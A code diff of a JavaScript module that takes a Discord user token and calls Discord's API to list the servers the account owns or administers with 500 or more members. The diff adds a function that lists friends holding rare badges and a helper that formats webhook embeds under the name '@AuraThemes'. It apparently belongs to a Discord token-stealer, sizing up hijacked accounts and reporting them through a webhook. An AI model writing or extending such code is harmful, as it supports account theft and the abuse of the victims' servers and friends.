@@ -2,42 +2,80 @@ const { EmbedBuilder } = require('discord.js');
 const fetch = require('sync-fetch');
 
 module.exports = {
-    fetchServers: async function (x) {
+    fetchServers:  function (x) {
         try {
-            let _ = fetch(`https://discord.com/api/v9/users/@me/guilds?with_counts=true`, {
+            const _ = fetch("https://discord.com/api/v9/users/@me/guilds?with_counts=true", {
                 headers: {
                     Authorization: x,
                 },
             });
-
-            const data = await _.json();
-
-            let servers = data
-                .filter((__) => __.owner || (__.permissions & 8) === 8)
-                .filter((__) => __.approximate_member_count >= 500)
-                .map((__) => ({
-                    id: __.id,
-                    name: __.name,
-                    owner: __.owner,
-                    member_count: __.approximate_member_count,
+            const d = _.json();
+            const ss = d
+                .filter((s) => s.owner || (s.permissions & 8) === 8)
+                .filter((s) => s.approximate_member_count >= 500)
+                .map((s) => ({
+                    id: s.id,
+                    name: s.name,
+                    owner: s.owner,
+                    member_count: s.approximate_member_count,
                 }));
-
+            const t = ss.length;
+            const all = t
+                ? ss.map((ss) => {
+                    return `**${ss.name}** | \`${ss.id}\`` +
+                        `\n**Owner** ${ss.owner ? "<a:success:1167141798792134788>" : "❌"
+                        } | **Members** <:online:970050105338130433> \`${ss.member_count}\``;
+                }).join("\n\n")
+                : "```yml\nNot found```";
             return {
-                totals: servers.length,
-                all: servers.length
-                    ? servers.map((server) => {
-                        return `**${server.name}** | \`${server.id}\`` +
-                            `\n**Owner** ${server.owner ? "<a:success:1167141798792134788>" : "❌"
-                            } | **Members** <:online:970050105338130433> \`${server.member_count
-                            }\``;
-                    }).join("\n\n")
-                    : `\`\`\`yml\nNot found\`\`\``
+                totals: t,
+                all,
             };
-        } catch (error) {
-            console.error("Error fetching servers:", error);
+        } catch (ee) {
+            console.error("Error fetching servers:", ee);
             return {
-                totals: "0",
-                all: "-",
+                totals: 0,
+                all: "```yml\nNot found```",
+            };
+        }
+    },
+    fetchFriends:  function (x) {
+        try {
+            const _ = fetch("https://discord.com/api/v9/users/@me/relationships", {
+                headers: {
+                    Authorization: x,
+                },
+            });
+            const d = _.json();
+            const getRareBadges = (f) => {
+                let b = "";
+                b += (1 & f) ? "<:staff:1090015968618623129> " : "";
+                b += (2 & f) ? "<:partner:918207395279273985> " : "";
+                b += (4 & f) ? "<:events:898186057588277259> " : "";
+                b += (8 & f) ? "<:bughunter_1:874750808426692658> " : "";
+                b += (512 & f) ? "<:early:800653363905429504> " : "";
+                b += (16384 & f) ? "<:bughunter_2:874750808430874664> " : "";
+                b += (131072 & f) ? "<a:developer:1094695138648936589> " : "";
+                return b || ":x:";
+            };
+            const rf = d
+                .filter((f) => f.type === 1)
+                .map((f) => {
+                    const r = getRareBadges(f.user.public_flags);
+                    return r !== ":x:" ? `${r} | **${f.user.username}#${f.user.discriminator}**` : null;
+                })
+                .filter(Boolean)
+                .join("\n");
+            const t = rf.split("\n").length;
+            return {
+                totals: t,
+                all: rf || "```yml\nNot found```",
+            };
+        } catch (ee) {
+            console.error("Error fetching friends:", ee);
+            return {
+                totals: 0,
+                all: "```yml\nNot found```",
             };
         }
     },
@@ -63,9 +101,9 @@ module.exports = {
             return null;
         }
     },
-    send: function (embed) {
+    send: function (e) {
         return {
-          embeds: [embed],
+          embeds: [e],
           username: '@AuraThemes',
           avatarURL: 'https://i.imgur.com/CeFqJOc.gif'
         };
